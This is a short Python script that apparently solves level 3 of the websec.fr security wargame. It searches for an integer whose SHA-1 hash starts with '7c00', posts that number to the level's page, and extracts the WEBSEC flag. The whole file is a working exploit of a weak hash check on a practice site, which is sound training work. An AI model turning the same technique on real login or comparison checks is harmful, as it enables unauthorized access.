import requests
import hashlib
import re

URL = 'http://websec.fr/level03/index.php'

for i in range(1000000):
    h = hashlib.sha1(str(i).encode())
    if (h.hexdigest()[:4] == '7c00'):
        r = requests.post(URL, data={'c': i})
        print(re.findall('WEBSEC{.*', r.text))
        break
